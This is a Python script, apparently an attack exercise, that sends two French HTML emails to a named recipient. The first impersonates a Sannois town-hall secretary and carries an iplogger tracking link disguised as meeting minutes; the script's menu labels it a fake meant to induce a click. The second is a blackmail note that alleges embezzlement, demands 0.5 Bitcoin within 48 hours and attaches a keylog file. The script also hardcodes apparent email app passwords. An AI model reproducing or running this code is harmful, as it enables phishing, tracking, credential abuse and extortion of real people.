from mail import send_mail

receiver_email = "sirakalloga@gmail.com"

sender_email1 = "nauriaanaelle.mathys@gmail.com"
password1 = "aqpp qtbx yoqe fjyx"
mail_subject1 = "Compte Rendu réunion"
mail_body1 = body_mail1 = """<html>
<body>
    <p>Bonjour Mme KALLOGA,</p>
    <p>J'espère que vous allez bien.</p><br>
    <p>Suite à notre précédente réunion, je vous joins ci-contre le compte rendu de cette dernière.</p>
    <p><a href='https://iplogger.com/2EyCP4' style='text-decoration:none; color:blue;'>Compte rendu réunion</a></p>

    <br>
    <p>Bien à vous,<br>
    Nauria MATHYS</p>
    <hr>
    <p style='font-size:12px; color:gray;'>
        Nauria MATHYS<br>
        <i>Secrétaire du Mairie de la ville de Sannois</i>
    </p>
</body>
</html>"""

mail_filename1 = ""

sender_email2 = "hemmyonc@gmail.com"
password2 = "uhqj rojl svve sdun"
mail_subject2 = "Comme c'est dommage..."
mail_body2 = """<html>
<body>
    <p>Alala... chère Mme KALLOGA...</p><br>
    <p>Que dirait votre ville si elle apprenait que les fonds supposés être donnés aux <b>collectes de dons sont en fait versés sur votre propre compte ?</b></p>
    <p><b>Un contrat avec Lactel et votre relevé de facture...</b> Votre dossier n'est pas si confidentiel que ça...</p>
    <p>Pas de panique, vos informations sont bien au chaud avec moi.</p>
    <p>Il vous suffira simplement de m'envoyer une rançon en crypto-monnaie.</p><br>
    <p><b>Modalités de paiement :</b></p>
    <ul>
        <li>Montant : 0.5 Bitcoin (BTC)</li>
        <li>Adresse du portefeuille : <code>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</code></li>
        <li>Envoyez le paiement sous 48 heures pour éviter toute fuite.</li>
    </ul><br>
    <p>Ne me faites pas trop patienter...</p>
    <p>Portez-vous bien,</p>
    <br>
    <hr>
    <p style='font-size:12px; color:gray;'>
        <i>Votre Scammer.</i><br>
    </p>
</body>
</html>"""
mail_filename2 = "keylog.txt"

def choose_and_send_mail():
    print("Quel mail souhaitez-vous envoyer ?")
    print("1. Premier mail (Fake pour inciter à cliquer)")
    print("2. Deuxième mail (Début de l'attaque)")
    choix = input("Entrez 1 ou 2 : ")

    if choix == "1":
        send_mail(sender_email1, receiver_email, password1, mail_subject1, mail_body1, mail_filename1)
    elif choix == "2":
        send_mail(sender_email2, receiver_email, password2, mail_subject2, mail_body2, mail_filename2)
    else:
        print("Choix invalide. Veuillez entrer 1 ou 2.")

choose_and_send_mail()